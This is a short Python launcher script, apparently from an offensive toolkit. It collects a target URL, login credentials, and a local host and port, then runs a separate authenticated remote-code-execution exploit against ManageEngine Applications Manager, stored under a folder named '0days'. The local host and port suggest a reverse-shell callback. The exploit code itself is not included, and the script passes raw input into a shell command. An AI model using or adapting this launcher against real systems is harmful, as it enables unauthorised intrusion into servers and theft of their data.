#/usr/bin/python3

import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    purple = '\033[0;35m'
    green = '\033[0;32m'
    blue = '\033[34m'
    end = '\033[m'


url = input(f"{Colors.red}(ManageEngine Applications Manager Authenticated){Colors.end} [Enter URL]:~#")
username = input(f"{Colors.red}(ManageEngine Applications Manager Authenticated){Colors.end} [Enter Username]:~#")
password = input(f"{Colors.red}(ManageEngine Applications Manager Authenticated){Colors.end} [Enter Password]:~#")
local_host = input(f"{Colors.red}(ManageEngine Applications Manager Authenticated){Colors.end} [Enter Local Host]:~#")
local_port = int(input(f"{Colors.red}(ManageEngine Applications Manager Authenticated){Colors.end} [Enter Local Port]:~#"))

sub.call(f"python3 ../0days/ManageEngine-Applications-Manager-Authenticated-RCE.py {url} {username} {password} {local_host} {local_port}", shell=True)
